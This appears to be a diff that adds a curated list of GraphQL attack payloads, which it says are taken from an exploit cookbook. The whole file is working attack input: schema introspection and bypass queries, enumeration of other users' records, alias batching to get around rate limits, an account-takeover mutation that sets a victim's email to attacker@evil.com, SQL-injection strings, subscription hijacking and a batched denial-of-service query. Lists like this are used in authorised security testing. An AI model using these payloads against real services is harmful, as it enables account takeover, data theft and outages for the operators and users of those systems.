@@ -1,0 +1,37 @@
+# GraphQL Attack Payloads - Curated from exploit-cookbook
+# Source: graphql-attacks.md + graphql-audit-7phase.md
+
+# Introspection query
+{__schema{queryType{name,fields{name,description,args{name,type{name,kind,ofType{name,kind}}}}}}}
+
+# Full introspection dump
+{__schema{types{name,kind,fields{name,type{name,kind,ofType{name,kind}},args{name,type{name}}}}}}
+
+# Mutation introspection
+{__schema{mutationType{name,fields{name,description,args{name,type{name,kind,ofType{name,kind}}}}}}}
+
+# BOLA via GraphQL
+query{user(id:"1"){id,name,email,role}}
+query{user(id:"2"){id,name,email,role}}
+query{users{edges{node{id,name,email,role}}}}
+
+# Alias batching (rate limit bypass)
+query{a1:user(id:"1"){email}a2:user(id:"2"){email}a3:user(id:"3"){email}}
+
+# Mutation abuse - change email (ATO)
+mutation{updateUser(input:{id:"1",email:"attacker@evil.com"}){id,email}}
+
+# Introspection bypass (when disabled)
+query{__type(name:"User"){fields{name,type{name}}}}
+
+# Error-based extraction
+query{user(id:"1 OR 1=1"){id,name}}
+query{user(id:"' OR 1=1--"){id,name}}
+
+# Subscription hijacking
+subscription{onUserUpdate{id,name,email}}
+
+# Batch DoS
+[{query:"{users{edges{node{id,name,email,phone,address}}}}"},
+ {query:"{users{edges{node{id,name,email,phone,address}}}}"},
+ {query:"{users{edges{node{id,name,email,phone,address}}}}"}]
